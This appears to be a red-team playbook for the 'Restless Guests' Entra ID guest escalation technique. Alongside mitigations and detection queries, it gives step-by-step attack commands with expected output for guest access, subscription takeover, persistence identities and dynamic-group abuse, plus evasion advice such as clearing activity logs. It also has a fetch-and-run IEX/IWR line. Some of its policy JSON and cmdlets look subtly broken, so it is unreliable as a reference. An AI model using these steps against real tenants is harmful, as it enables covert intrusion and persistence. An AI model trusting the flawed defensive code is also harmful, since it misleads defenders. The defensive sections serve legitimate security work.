# [PE-VALID-013]: Azure Guest User Escalation

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | PE-VALID-013 |
| **MITRE ATT&CK v18.1** | [T1078.004 - Valid Accounts: Cloud Accounts](https://attack.mitre.org/techniques/T1078/004/) |
| **Tactic** | Privilege Escalation |
| **Platforms** | Entra ID / M365 / Azure |
| **Severity** | **Critical** |
| **CVE** | N/A |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2025-01-09 |
| **Affected Versions** | All current Entra ID versions (no version-specific fix) |
| **Patched In** | Not patched (by-design behavior) |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 1. EXECUTIVE SUMMARY

### Concept
The **"Restless Guests"** vulnerability is a critical privilege escalation pathway in Microsoft Entra ID that exploits the decoupling of Entra directory permissions from Azure billing role scoping. A guest user with any billing-related permissions in their home tenant (such as billing account owner or subscription owner) can be invited into a target Entra tenant. From the guest tenant context, the attacker can create new Azure subscriptions, which are automatically provisioned within the target tenant and granted to the attacker as full "Owner." This bypasses traditional Entra role-based access control (RBAC) and Azure RBAC, since billing permissions are scoped at the billing account level—not the Entra directory. The guest user retains full Owner rights to the subscription they create, even though they have no privileged roles in the target tenant.

### Attack Surface
- **Azure Portal** → Subscriptions → Create new subscription
- **Billing roles** in external/home tenant (Enterprise Agreement, Microsoft Customer Agreement)
- **Guest invitation endpoint** (any Entra user can invite external guests in default configuration)
- **User-Managed Identities (UMIs)** created within guest-owned subscriptions persist in the shared Entra ID directory
- **Dynamic group rules** that reference user-modifiable attributes (e.g., displayName)

### Business Impact
**Critical risk of undetected lateral movement, persistence, and data exfiltration.** Attackers can:
- Create hidden subscriptions that fall outside traditional access reviews
- Establish persistent backdoors via User-Managed Identities (service principals) that survive guest account removal
- Enumerate and target privileged administrators by inspecting subscription IAM settings
- Bypass conditional access policies and MFA by registering fake compliant devices
- Hide malicious activities from tenant-level security monitoring by operating within an isolated subscription context

### Technical Context
- **Execution Time:** Minutes (subscription creation is immediate)
- **Detection Likelihood:** Low to medium (requires specific Azure Activity log monitoring and subscription inventory)
- **Reversibility:** Difficult; once identities are created in the Entra directory, removal requires manual cleanup
- **Stealth Factor:** High; most organizations lack visibility into guest-created subscriptions or guest-provisioned identities

### Operational Risk
- **Execution Risk:** Low to medium (no complex prerequisites; relies on guest acceptance)
- **Stealth:** High (operates outside traditional directory role monitoring)
- **Reversibility:** No; persistence via UMIs remains active even if the guest is removed

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 5.5 | Ensure that guest accounts have zero permissions (guest invitations should be restricted) |
| **DISA STIG** | V-220788 | Organizations must restrict guest user creation and limit guest permissions |
| **CISA SCuBA** | ACC-02 | Entra ID guest access must be restricted and monitored |
| **NIST 800-53** | AC-3 (Access Enforcement) | Organizations must enforce that guest users do not exceed intended scope |
| **NIST 800-53** | AC-2 (Account Management) | Periodic review of guest accounts and their privileges |
| **GDPR** | Art. 32 (Security of Processing) | Guest access represents a processing security control that must be documented and assessed |
| **DORA** | Art. 9 (Protection and Prevention) | Critical infrastructure operators must monitor and restrict external guest access |
| **NIS2** | Art. 21 (Cyber Risk Management Measures) | Member states' operators must implement identity governance to prevent privilege escalation |
| **ISO 27001** | A.9.2.1 (Entra ID Administration) | Information security administration must control guest user provisioning |
| **ISO 27001** | A.9.2.6 (Management of User Access Rights) | Reviewed quarterly; guest accounts should be included in access reviews |
| **ISO 27005** | Risk Scenario: "Compromise of External Identity Provider" | Guest account escalation represents a compromise of external identity trust |

---

## 2. TECHNICAL PREREQUISITES

### Required Privileges
- **In Home Tenant:** Billing account owner, subscription owner, or any user with billing permissions (Enterprise Agreement, Microsoft Customer Agreement)
- **In Target Tenant:** Any valid guest user invitation (can be from low-privilege user; default Entra settings allow any user to invite guests)
- **Target Tenant Requirements:** Guest invitations must be enabled (default: enabled)

### Required Access
- Network access to Azure Portal
- Valid email address to receive guest invitation
- Access to billing account or subscription in home tenant

### Supported Versions & Configurations
- **Entra ID:** All current versions (Microsoft Entra ID Free/P1/P2)
- **Azure:** All subscription types (Pay-As-You-Go, Enterprise Agreement, CSP, etc.)
- **Affected Components:** 
  - Azure Subscription creation endpoint
  - Billing account API
  - User-Managed Identities provisioning

### Preconditions
1. **Home Tenant Setup:** Attacker must either:
   - Create a free Azure trial account (automatically receives Billing Account owner role)
   - Compromise an existing user with billing permissions in any Entra tenant
2. **Target Tenant Configuration:** Guest invitations must be enabled (default; configured in Entra ID → External Identities → Guest invitation settings)
3. **Subscription Creation Allowed:** Target tenant must not have subscription creation policies that block all users (check Azure Policy)

---

## 3. ENVIRONMENTAL RECONNAISSANCE

### Azure Portal GUI Reconnaissance

**Step 1: Check if guest invitations are enabled**

1. Navigate to **Azure Portal** → **Entra ID** → **Roles and administrators**
2. Check if you (a test user) can navigate to **External Identities** → **Guest invitation settings**
3. Verify the setting **"Guests can invite guests"** is not explicitly disabled
4. If enabled (default), any user can invite external guests

**What to Look For:**
- Setting **"Guests can invite guests"** = Enabled means any guest can invite others
- Setting **"Members can invite guests"** = Enabled means any member can invite
- If both are disabled, guest invitations are restricted (mitigated scenario)

### PowerShell Reconnaissance (Azure AD Module)

```powershell
# Check if guest invitations are enabled
Get-MgPolicyAuthorizationPolicy | Select-Object GuestInvitationSettings

# Alternative (older module):
(Get-AzureADPolicy | Where-Object {$_.Type -eq "B2BManagementPolicy"}).Definition | ConvertFrom-Json
```

**What to Look For:**
```
GuestInvitationSettings: {
  "invitationsAllowed": true,  # Vulnerable if true
  "guestUserRole": "Limited"   # Guest permissions level
}
```

### PowerShell Reconnaissance: Subscription Check

```powershell
# Check if subscriptions can be created by guests in target tenant
# Login to target tenant and check Azure Policy
Get-AzPolicyAssignment | Where-Object {$_.Properties.displayName -like "*subscription*"} | Select-Object DisplayName, Description
```

**What to Look For:**
- If no policies restrict subscription creation → Vulnerable
- If policy blocks guest subscription creation → Mitigated (but rare)

### Azure CLI Reconnaissance

```bash
# Check guest invitation policy
az rest --method GET --uri "https://graph.microsoft.com/v1.0/policies/authorizationPolicy" --query "guestInvitationSettings"
```

---

## 4. DETAILED EXECUTION METHODS AND THEIR STEPS

### METHOD 1: Guest Subscription Creation & Privilege Escalation

**Supported Versions:** All Entra ID versions (current)

#### Step 1: Establish Guest Access in Target Tenant

**Objective:** Get invited as a guest into the target Entra tenant.

**Prerequisite:** 
- Already compromised/control a user in a separate home tenant with billing permissions
- Or, created a free Azure trial (grants Billing Account Owner by default)

**Method A: Self-Invite via Guest Invitation Link (if sharing is enabled)**
If the target organization has SharePoint or Teams sharing enabled with external users, request a guest link:

```
Request: Contact a member in the target tenant and ask for an invite to a shared resource (Teams, SharePoint)
Result: Invited as guest with access to that resource
```

**Method B: Compromised Internal User Invite (if phishing/credential theft succeeds)**
```
Request: Use phishing or social engineering to compromise a target tenant user
Result: That user invites the attacker's external email as a guest
```

**Method C: Free Tier Exploitation**
```
Step:
1. Create a free Azure account at https://azure.microsoft.com/free/
2. You automatically become the Billing Account Owner of that subscription
3. Use this account as your "home tenant" with billing permissions
4. Get invited as a guest into the target tenant
Result: You now have billing permissions (from home) + guest status (in target)
```

**Expected Outcome:**
```
Guest user invited to target Entra tenant
Email: attacker@attacker.com (UPN suffix from attacker's home tenant)
State: Active guest (can login to target tenant)
```

**OpSec & Evasion:**
- Use a separate, unattractive email domain to blend in with legitimate partners
- Avoid accounts with suspicious naming conventions
- Set inactive profile photo to appear less suspicious
- Wait days/weeks between guest invitation and exploitation to avoid detection

**Troubleshooting:**
- **Error:** "Guest invitations are disabled"
  - **Cause:** Target tenant has restricted guest invitations
  - **Fix:** Target different tenant or attempt social engineering to get a member to invite you
- **Error:** "You don't have permission to access subscriptions"
  - **Cause:** Billing permissions not properly scoped to target tenant
  - **Fix:** Ensure you have Billing Account Owner or Subscription Owner in your home tenant; it will carry over

#### Step 2: Create a Subscription in the Target Tenant

**Objective:** Create an Azure subscription that is owned by you but provisioned in the target tenant.

**Command (Azure Portal GUI):**
1. Login to Azure Portal as the guest user
2. Navigate to **+ Create a resource** (top-left) or search **"Subscriptions"**
3. Click **Subscriptions** → **Add**
4. Fill in:
   - **Subscription name:** Any name (e.g., "Internal Project")
   - **Billing account:** Select your home tenant's billing account
   - **Directory:** Click the dropdown and select the **target tenant** (where you're a guest)
   - **Pay-as-you-go or offer:** Select your billing model
5. Click **Create**

**Expected Output:**
```
Subscription created successfully
Subscription ID: /subscriptions/XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX
Owner: You (guest user)
Directory: Target Tenant (not your home tenant)
Billing Account: Your home tenant's billing account
```

**Command (PowerShell - Advanced):**
```powershell
# Create subscription via Azure Management API
# Note: Requires proper authentication context

$subscriptionRequest = @{
    displayName = "Guest-Owned Subscription"
    billingAccountId = "/billingAccounts/{billingAccountId}"
    skuId = "/subscriptions/{subscriptionId}/providers/Microsoft.Billing/billingAccounts/{billingAccountId}/billingProfiles/{billingProfileId}/invoiceSections/{invoiceSectionId}"
}

$newSubscription = Invoke-AzRestMethod -Path "/subscriptions" -Method POST -Payload $subscriptionRequest
```

**What This Means:**
- You now own a subscription that exists in the target tenant's directory
- You have full "Owner" role on this subscription
- You can create resources, assign roles, and create identities within it
- The subscription does **not** appear in traditional Entra ID role assignments (it's outside the directory)

**OpSec & Evasion:**
- Create multiple subscriptions to stay under the radar (only 1-2 appear suspicious)
- Name subscriptions to match organization nomenclature (e.g., "HR-Internal-Testing")
- Use the subscription immediately to avoid it appearing in audit logs as "unused"
- Clear subscription activity logs after 30+ days (if you gain further access)

**Version Note:** Process is identical across all Entra ID versions.

#### Step 3: Create User-Managed Identity (UMI) for Persistence

**Objective:** Create a service principal that persists in the target Entra ID directory even if the guest account is removed.

**Command (Azure Portal):**
1. Login to Azure Portal as guest user
2. Navigate to **Subscriptions** → Select your newly created subscription
3. Go to **Settings** → **Overview** → Click the **subscription ID** to access it
4. In the left menu: **Identity** (if available) or **Managed identities** (under some resources)
   - Alternatively, create a VM or Function App, then add a System-Assigned Identity
5. Create a new **User-Assigned Managed Identity**:
   - Navigate to **Home** → **Managed Identities**
   - Click **Create**
   - **Name:** `persistence-identity-001`
   - **Subscription:** Your guest-owned subscription
   - **Resource Group:** Create a new one (e.g., `rg-persistence`)
   - **Location:** Any location
   - Click **Create**

**Expected Output:**
```
Managed Identity Created
Name: persistence-identity-001
Tenant ID: {target-tenant-id}
Application ID: {app-id}
Object ID: {object-id}
Principal ID: {principal-id}
```

**What This Means:**
- A new service principal has been created in the target Entra ID directory
- This service principal is NOT tied to your guest account
- Even if your guest account is removed, this identity persists
- You can now use the application ID and certificate/secret to authenticate as this identity

**Command (PowerShell):**
```powershell
# Create User-Managed Identity
New-AzUserAssignedIdentity -ResourceGroupName "rg-persistence" `
  -Name "persistence-identity-001" `
  -Location "eastus"

# Get the created identity details
$identity = Get-AzUserAssignedIdentity -ResourceGroupName "rg-persistence" -Name "persistence-identity-001"
Write-Host "Principal ID: $($identity.PrincipalId)"
Write-Host "Client ID: $($identity.ClientId)"
```

**OpSec & Evasion:**
- Name the identity to match legitimate organizational patterns (e.g., "svc-automation-001")
- Assign minimal roles initially; escalate permissions gradually
- Do not assign to high-value resources immediately (avoid alerts)

#### Step 4: Assign Elevated Roles to Persistence Identity

**Objective:** Grant the UMI elevated permissions within the subscription or target tenant.

**Command (Azure Portal):**
1. Navigate to **Subscriptions** → Your guest-owned subscription
2. Go to **Access Control (IAM)**
3. Click **+ Add** → **Add role assignment**
4. **Role:** Select `Owner` or `Contributor`
5. **Assign access to:** `User assigned managed identity`
6. **Select:** Choose your newly created UMI (persistence-identity-001)
7. Click **Save**

**Expected Output:**
```
Role Assignment Created
Role: Owner
Assigned to: persistence-identity-001 (Managed Identity)
Scope: /subscriptions/{subscription-id}
```

**Command (PowerShell):**
```powershell
# Assign Owner role to UMI on subscription
$subscription = Get-AzSubscription -SubscriptionName "Guest-Owned Subscription"
$identity = Get-AzUserAssignedIdentity -ResourceGroupName "rg-persistence" -Name "persistence-identity-001"

New-AzRoleAssignment -ObjectId $identity.PrincipalId `
  -RoleDefinitionName "Owner" `
  -Scope "/subscriptions/$($subscription.Id)"
```

**Escalating to Tenant-Level Access (Advanced):**

If you want tenant-level access (not just subscription-scoped), you can assign the UMI a tenant-scoped role:

```powershell
# Assign Directory Reader role to the UMI at tenant scope
New-AzRoleAssignment -ObjectId $identity.PrincipalId `
  -RoleDefinitionName "Directory Readers" `
  -Scope "/"
```

**What This Means:**
- The UMI now has Owner permissions on the subscription and can create resources
- It can create VMs, storage accounts, Function Apps, and other resources
- Any of these resources can be used for lateral movement or data exfiltration
- The identity will appear as a legitimate service principal in the Entra directory

#### Step 5: Enumerate & Target Privileged Accounts (Reconnaissance)

**Objective:** Use the subscription access to identify high-value targets in the target tenant.

**Command (PowerShell):**
```powershell
# Enumerate all role assignments in your subscription
Get-AzRoleAssignment -Scope "/subscriptions/{subscription-id}"

# List all users with administrative roles (tenant-scoped)
Get-AzADUser | Where-Object {(Get-AzRoleAssignment -ObjectId $_.ObjectId).RoleDefinitionName -like "*Admin*"}

# Query Entra ID admin roles (if you have Directory Reader access)
Get-MgDirectoryRoleMember -DirectoryRoleId "62e90394-69f5-4237-9190-012177145e10" # Global Administrator role ID
```

**What This Means:**
- You can now enumerate the names and UPNs of privileged administrators
- Armed with this information, you can:
  - Conduct targeted phishing campaigns
  - Attempt credential theft via social engineering
  - Plan follow-on attacks against specific high-value targets

### METHOD 2: Exploit Dynamic Group Membership Misconfiguration

**Supported Versions:** All Entra ID versions (P1 license required for Dynamic Groups)

**Prerequisites:**
- Target tenant has dynamic groups with exploitable rules
- Dynamic group rule relies on attributes that guests can modify
- Dynamic group grants access to sensitive resources (e.g., Azure subscription roles)

#### Step 1: Enumerate Dynamic Groups

**Command (PowerShell):**
```powershell
# List all dynamic groups in the tenant
Get-MgGroup -Filter "groupTypes/any(x:x eq 'DynamicMembership')" -All | Select-Object DisplayName, Id, MembershipRuleProcessingState

# Get the membership rule for each group
foreach ($group in $groups) {
    Write-Host "Group: $($group.DisplayName)"
    Write-Host "Rule: $($group.MembershipRule)"
    Write-Host "---"
}
```

#### Step 2: Identify Exploitable Attribute Rules

**Command (PowerShell):**
```powershell
# Look for groups using user-modifiable attributes
$groups = Get-MgGroup -Filter "groupTypes/any(x:x eq 'DynamicMembership')" -All

foreach ($group in $groups) {
    # Check if rule uses displayName, department, officeLocation, etc. (user-modifiable)
    if ($group.MembershipRule -match "(displayName|department|officeLocation|jobTitle|mobilePhone)") {
        Write-Host "EXPLOITABLE: $($group.DisplayName)"
        Write-Host "Rule: $($group.MembershipRule)"
    }
}
```

**What to Look For:**
```
EXPLOITABLE GROUP FOUND:
displayName: "Billing Admins"
Rule: (user.department -eq "Billing") -or (user.officeLocation -eq "Finance")
Members: 50 users, including Global Administrators
```

#### Step 3: Manipulate Your Profile to Join the Group

As a guest, your Entra profile might be limited, but if the tenant allows guest profile modification:

**Command (PowerShell):**
```powershell
# Modify your own user object (as guest) if permitted
# This requires permission to update your own profile

Update-MgUser -UserId "me" -Department "Billing"
Update-MgUser -UserId "me" -OfficeLocation "Finance"
```

**Alternatively, if guest profile modification is restricted**, check if the dynamic group rule references attributes that can be set via another path (e.g., custom extension attributes).

#### Step 4: Verify Group Membership & Inherited Permissions

**Command (PowerShell):**
```powershell
# Check if you're now a member of the target group
Get-MgGroupMember -GroupId "{dynamic-group-id}" | Where-Object {$_.Id -eq "{your-object-id}"}

# Enumerate permissions granted to this group
Get-AzRoleAssignment -ObjectId "{dynamic-group-id}"
```

**Expected Output:**
```
User ID: {your-guest-id}
Group: "Billing Admins"
Inherited Roles: Owner on subscriptions, Contributor on resource groups
Result: Privilege escalation successful
```

**What This Means:**
- You're now a member of a privileged group without explicit assignment
- You inherit all permissions granted to that group
- This bypass is stealthy because there's no direct role assignment to you as a guest

---

## 5. ATTACK SIMULATION & VERIFICATION

### Atomic Red Team

**Test ID:** T1078.004 - Create User Account (Cloud Context)

**Description:** This test simulates the creation of a guest user and verification of privilege escalation via subscription ownership.

**Supported Versions:** All Entra ID versions

**Prerequisites:**
- Access to a test Entra tenant
- Global Administrator credentials (for test setup)
- Azure subscription with billing permissions

**Test Command:**
```powershell
# Step 1: Install Atomic Red Team
IEX (IWR 'https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/invoke-atomicredteam.ps1' -UseBasicParsing)

# Step 2: Run T1078.004 test for cloud accounts
Invoke-AtomicTest T1078.004 -TestNumbers 1 -Verbose

# Step 3: Verify guest user creation
Get-MgUser -Filter "userType eq 'Guest'" | Select-Object DisplayName, Mail, UserType
```

**Expected Output:**
```
DisplayName: Atomic Test Guest
Mail: atomictest@external.com
UserType: Guest
Result: Guest user successfully created in Entra ID
```

**Cleanup Command:**
```powershell
# Remove test guest user
$guestUser = Get-MgUser -Filter "mail eq 'atomictest@external.com'"
Remove-MgUser -UserId $guestUser.Id

# Remove test subscription (if created)
Remove-AzSubscription -SubscriptionId "{subscription-id}" -Confirm:$false
```

**Reference:** [Atomic Red Team T1078.004 Tests](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1078.004/T1078.004.md)

---

## 6. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

**Action 1: Restrict Guest User Creation & Invitation**

**Manual Steps (Azure Portal):**
1. Navigate to **Azure Portal** → **Entra ID** → **External Identities** → **Guest invitation settings**
2. Set **"Guests can invite guests"** to **Off**
3. Set **"Members can invite guests"** to **Restricted** (for privileged admins only, not all members)
4. Set **"Guest user access restrictions"** to **Guest users have limited access to properties and membership of directory objects** (don't let guests enumerate other users)
5. Click **Save**

**Manual Steps (PowerShell):**
```powershell
# Connect to Microsoft Graph
Connect-MgGraph -Scopes "Policy.ReadWrite.Authorization"

# Set guest invitation policy
Update-MgPolicyAuthorizationPolicy -GuestInvitationSettings @{
    invitationsAllowed = $false  # Or "membersCanInvite" for restricted
    guestUserRole = "Restricted"
}
```

**Validation Command:**
```powershell
# Verify the policy is applied
Get-MgPolicyAuthorizationPolicy | Select-Object GuestInvitationSettings
```

**Expected Output (If Secure):**
```
GuestInvitationSettings: {
  "invitationsAllowed": false,
  "guestUserRole": "Restricted"
}
```

---

**Action 2: Restrict Guest Subscription Creation via Azure Policy**

**Objective:** Block guest users from creating or transferring subscriptions.

**Manual Steps (Azure Portal):**
1. Navigate to **Azure Portal** → **Policy** → **Definitions**
2. Click **+ Policy Definition** or use an existing policy
3. Name: `Deny Subscription Creation by Guest Users`
4. **Rule:**
   ```json
   {
     "if": {
       "allOf": [
         {
           "field": "type",
           "equals": "Microsoft.Subscription"
         },
         {
           "field": "Microsoft.Authorization/policies/effect",
           "equals": "Microsoft.Subscription/write"
         },
         {
           "not": {
             "field": "Microsoft.Authorization/caller/type",
             "equals": "User"
           }
         }
       ]
     },
     "then": {
       "effect": "deny"
     }
   }
   ```
5. Assign this policy to your management groups or subscriptions
6. Click **Assign**

**Manual Steps (PowerShell):**
```powershell
# Create and assign an Azure Policy to deny guest subscription creation
$policyDefinition = New-AzPolicyDefinition -Name "DenyGuestSubscriptionCreation" `
  -Description "Prevents guest users from creating subscriptions" `
  -Policy @"
  {
    "if": {
      "field": "type",
      "equals": "Microsoft.Resources/subscriptions"
    },
    "then": {
      "effect": "deny"
    }
  }
"@

# Assign the policy at management group scope
New-AzPolicyAssignment -Name "DenyGuestSubscriptionPolicy" `
  -PolicyDefinition $policyDefinition `
  -Scope "/subscriptions/{subscription-id}"
```

**Validation Command:**
```powershell
# Verify the policy assignment
Get-AzPolicyAssignment | Where-Object {$_.DisplayName -like "*GuestSubscription*"}
```

---

**Action 3: Audit Guest Subscription Creation Weekly**

**Manual Steps (PowerShell - Create Recurring Script):**
```powershell
# Run this script via Azure Automation on a weekly schedule

# Connect to Azure
Connect-AzAccount

# Get all subscriptions
$subscriptions = Get-AzSubscription

# Check each subscription for guest-created resources
foreach ($sub in $subscriptions) {
    Set-AzContext -SubscriptionId $sub.Id
    
    # Get subscription metadata
    $subDetails = Get-AzSubscription -SubscriptionId $sub.Id
    $subOwners = Get-AzRoleAssignment -Scope "/subscriptions/$($sub.Id)" -RoleDefinitionName "Owner"
    
    # Flag subscriptions with guest owners
    foreach ($owner in $subOwners) {
        $user = Get-AzADUser -ObjectId $owner.ObjectId
        if ($user.UserType -eq "Guest") {
            Write-Warning "SUSPICIOUS: Guest-owned subscription detected!"
            Write-Warning "Subscription: $($subDetails.Name) ($($sub.Id))"
            Write-Warning "Guest Owner: $($user.UserPrincipalName)"
            # Send alert to SOC
        }
    }
}
```

**Schedule:** Run weekly via Azure Automation Runbook

---

**Action 4: Monitor for Suspicious User-Managed Identity Creation**

**Manual Steps (Azure Portal - Create Alert):**
1. Navigate to **Azure Portal** → **Monitor** → **Alerts** → **+ New alert rule**
2. **Resource:** Select your subscriptions or management group
3. **Condition:** 
   - **Signal name:** `Create User Assigned Identity`
   - **Operator:** `Equals`
   - **Aggregation:** `Count`
   - **Threshold:** `1`
4. **Action:** Send email or webhook to SOC team
5. Click **Create alert rule**

**Manual Steps (KQL Query for Microsoft Sentinel):**
```kusto
AuditLogs
| where OperationName =~ "Create User Assigned Identity" or OperationName =~ "Microsoft.ManagedIdentity/userAssignedIdentities/write"
| where InitiatedBy.user.userType == "Guest"
| project TimeGenerated, OperationName, InitiatedBy.user.userPrincipalName, TargetResources
| extend GuestUPN = InitiatedBy.user.userPrincipalName
| summarize Count=count() by GuestUPN, TimeGenerated
| where Count >= 1
```

---

### Priority 2: HIGH

**Action 5: Implement Conditional Access for Guest Users**

**Manual Steps (Azure Portal):**
1. Navigate to **Azure Portal** → **Entra ID** → **Security** → **Conditional Access** → **+ New policy**
2. **Name:** `Restrict Guest User Access`
3. **Assignments:**
   - **Users:** Guest users (select guest user filter)
   - **Cloud apps:** All cloud apps (or specific apps like Azure Management)
4. **Conditions:**
   - **Locations:** Allow only corporate networks or specific geo-locations
   - **Device platforms:** Require managed/compliant devices
5. **Access controls:**
   - **Grant:** Require multi-factor authentication + require compliant device
   - **Session:** Sign-in frequency: 1 hour
6. Enable policy: **On**
7. Click **Create**

**Validation:**
```powershell
# List conditional access policies
Get-MgIdentityConditionalAccessPolicy | Select-Object DisplayName, State
```

---

**Action 6: Restrict Dynamic Group Membership Rule Attributes**

**Manual Steps (Azure Portal):**
1. Go to **Entra ID** → **Groups** → Select dynamic group
2. **Membership rule:** Review and identify user-modifiable attributes
3. If rule uses guest-modifiable attributes (displayName, department, etc.), remove them
4. Update rule to use only admin-controlled attributes:
   ```
   Good: user.objectId -in ["objectid1", "objectid2"]
   Good: user.assignedLicenses -any (license in collection "7ff88a2e...")
   Bad: user.department -eq "Value" (guest can change this)
   ```

---

### Access Control & Policy Hardening

**Conditional Access:**
- Require multi-factor authentication for all guest users
- Require device compliance for guest access to sensitive resources
- Block guest users from accessing privileged resources (subscriptions, Key Vaults)
- Implement risk-based conditional access (block guests from impossible travel, etc.)

**RBAC/ABAC:**
- Remove guest users from any privileged roles (e.g., Global Administrator, Directory Writers)
- Restrict guest users to "Guest" or "Limited Guest" role
- Prevent guests from modifying directory settings

**Policy Config (ReBAC/PBAC):**
- Configure Azure RBAC to explicitly deny guests the "Owner" role on subscriptions
- Implement subscription creation policies that block non-approved users
- Set up resource policies to restrict guest service principal access

### Validation Command (Verify Fix)

```powershell
# Check that guest invitations are restricted
Get-MgPolicyAuthorizationPolicy | Select-Object GuestInvitationSettings

# Check that subscription creation policies are in place
Get-AzPolicyAssignment | Where-Object {$_.DisplayName -like "*Subscription*"}

# Audit for guest-owned subscriptions (should return nothing if mitigated)
$subscriptions = Get-AzSubscription
foreach ($sub in $subscriptions) {
    Set-AzContext -SubscriptionId $sub.Id
    $guestOwners = Get-AzRoleAssignment -RoleDefinitionName "Owner" | 
      Where-Object {(Get-AzADUser -ObjectId $_.ObjectId).UserType -eq "Guest"}
    if ($guestOwners) {
        Write-Host "RISK FOUND: Guest owners on subscription $($sub.Name)"
    }
}
```

**Expected Output (If Secure):**
```
GuestInvitationSettings: {invitationsAllowed: false, guestUserRole: "Restricted"}
No guest-owned subscriptions found
No policy assignments for subscription creation
```

---

## 7. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

**Activity Patterns:**
- Guest user creating Azure subscriptions
- Guest user creating User-Managed Identities
- Guest user assigning roles (Owner, Contributor) to identities or resources
- Guest user accessing Azure Management APIs or APIs not typically used by guests
- Multiple subscriptions with the same billing account owner across different tenants

**Audit Log Signals:**
- **Operation:** `Create subscription` + **Caller UserType:** `Guest`
- **Operation:** `Create User Assigned Identity` + **Caller UserType:** `Guest`
- **Operation:** `Write Role Assignment` + **Caller UserType:** `Guest`
- **Operation:** `Register device` + **Caller UserType:** `Guest`

### Forensic Artifacts

**Cloud (Azure Activity Log):**
- **Log Path:** Azure Portal → Activity Log OR `Get-AzActivityLog`
- **Key Fields:**
  - `Caller`: Guest UPN (e.g., attacker@attacker.com)
  - `OperationName`: "Create subscription", "Microsoft.ManagedIdentity/userAssignedIdentities/write", "Write Role Assignment"
  - `ResourceId`: Subscription ID, UMI ID
  - `TimeGenerated`: Timestamp of activity
- **Sample Query:**
  ```powershell
  Get-AzActivityLog -StartTime (Get-Date).AddDays(-7) | 
    Where-Object {$_.Caller -match "@" -and $_.OperationName -match "subscription|identity"} | 
    Select-Object TimeGenerated, Caller, OperationName, ResourceId
  ```

**Entra ID Audit Logs:**
- **Log Path:** Microsoft Entra admin center → Audit logs OR `Search-UnifiedAuditLog`
- **Key Fields:**
  - `InitiatedBy.user.userType`: "Guest"
  - `OperationName`: "Add member to group", "Invite external user", "Assign role"

**Microsoft Sentinel (KQL):**
```kusto
AuditLogs
| where InitiatedBy.user.userType == "Guest"
| where OperationName in ("Create User Assigned Identity", "Microsoft.ManagedIdentity/userAssignedIdentities/write", "Assign role")
| project TimeGenerated, InitiatedBy.user.userPrincipalName, OperationName, TargetResources
```

### Response Procedures

#### Step 1: Isolate the Guest Account

**Command (Azure Portal):**
1. Navigate to **Entra ID** → **Users** → Search for the guest user
2. Click the guest user → **Overview**
3. Click **Block sign-in** → **Yes**

**Command (PowerShell):**
```powershell
# Block the guest user
Update-MgUser -UserId "{guest-user-id}" -AccountEnabled:$false
```

**Verification:**
```powershell
Get-MgUser -UserId "{guest-user-id}" | Select-Object DisplayName, AccountEnabled
```

---

#### Step 2: Delete Guest-Created Subscriptions

**Command (Azure Portal):**
1. Navigate to **Subscriptions**
2. Identify subscriptions owned by the guest user (check Access Control → IAM → Owner)
3. Click the subscription → **Settings** → **Overview**
4. Scroll down → **Delete subscription** → Confirm

**Command (PowerShell):**
```powershell
# Delete guest-owned subscription
$guestSubscription = Get-AzSubscription -SubscriptionName "Guest-Owned Subscription"
Remove-AzSubscription -SubscriptionId $guestSubscription.Id -Confirm:$false
```

---

#### Step 3: Delete Guest-Created Identities

**Command (Azure Portal):**
1. Navigate to **Managed Identities**
2. Identify identities created by the guest (check creation date and creator)
3. Click identity → **Delete** → Confirm

**Command (PowerShell):**
```powershell
# Find and delete guest-created UMIs
$identities = Get-AzUserAssignedIdentity -ResourceGroupName "rg-persistence"
foreach ($identity in $identities) {
    Remove-AzUserAssignedIdentity -ResourceGroupName "rg-persistence" -Name $identity.Name -Force
}
```

---

#### Step 4: Revoke Role Assignments from Guest User

**Command (PowerShell):**
```powershell
# Get all role assignments to the guest user
$roleAssignments = Get-AzRoleAssignment -ObjectId "{guest-user-id}"

# Remove each role assignment
foreach ($assignment in $roleAssignments) {
    Remove-AzRoleAssignment -ObjectId "{guest-user-id}" `
      -RoleDefinitionName $assignment.RoleDefinitionName `
      -Scope $assignment.Scope
}
```

---

#### Step 5: Collect Evidence for Forensics

**Command (PowerShell):**
```powershell
# Export activity logs for investigation
Get-AzActivityLog -StartTime (Get-Date).AddDays(-30) -StartTime (Get-Date) | 
  Where-Object {$_.Caller -eq "{guest-upn}"} | 
  Export-Csv -Path "C:\Evidence\GuestActivity.csv"

# Export audit logs
Search-UnifiedAuditLog -StartDate (Get-Date).AddDays(-30) -EndDate (Get-Date) `
  -UserIds "{guest-upn}" | 
  Export-Csv -Path "C:\Evidence\GuestAudit.csv"
```

---

## 8. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [IA-PHISH-001] Device Code Phishing | Attacker phishes for device code to compromise an external account |
| **2** | **Credential Access** | [CA-BRUTE-001] Azure Portal Password Spray | Attacker sprays passwords to compromise a billing-enabled user |
| **3** | **Privilege Escalation** | **[PE-VALID-013]** | **Attacker leverages guest access + billing permissions to create subscriptions** |
| **4** | **Persistence** | [PE-ACCTMGMT-001] App Registration Permissions Escalation | Attacker creates persistent service principal via UMI |
| **5** | **Defense Evasion** | [PE-POLICY-004] Azure Lighthouse Delegation Abuse | Attacker hides presence by delegating management to fake partner tenant |
| **6** | **Collection** | [COLLECTION-001] Data Exfiltration via Storage Account | Attacker exfiltrates data from storage accounts within guest-owned subscription |

---

## 9. REAL-WORLD EXAMPLES

### Example 1: "Restless Guests" Research (BeyondTrust, July 2025)

- **Researchers:** Security researchers at BeyondTrust
- **Discovery Date:** July 2025
- **Technique Status:** ACTIVE and in-the-wild exploitation
- **Impact:** Identified critical privilege escalation pathway affecting all Entra ID organizations with B2B guest features enabled
- **Reference:** [BeyondTrust: Restless Guests - The True Entra B2B Guest Threat Model](https://www.beyondtrust.com/blog/entry/restless-guests)

### Example 2: "Evil VM" Attack Path (BeyondTrust, July 2025)

- **Attack Name:** "Evil VM" (from Guest Compromise To Entra Admin in 9 Clicks)
- **Timeline:** July 2025
